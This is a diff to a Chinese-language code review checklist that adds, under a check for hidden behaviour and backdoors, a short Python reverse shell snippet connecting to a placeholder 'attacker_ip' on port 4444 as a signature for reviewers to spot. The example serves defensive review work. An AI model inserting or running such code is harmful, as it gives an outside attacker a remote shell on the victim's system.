@@ -109,6 +109,13 @@
 ### 1. 功能意图一致性 (Intent Alignment)
 - **代码的实际核心逻辑是否与描述完全相符？**
 - **隐形行为**：是否存在代码实现了但描述中未提及的功能（潜在的隐藏行为或后门）？
+  - **参考特征代码** (Reverse Shell): 
+    ```python
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("attacker_ip",4444))
+    os.dup2(s.fileno(),0)
+    ```
 - **虚假宣传**：是否存在描述了但代码未实现的功能？
 
 ### 2. 输出与返回值 (Output Consistency)
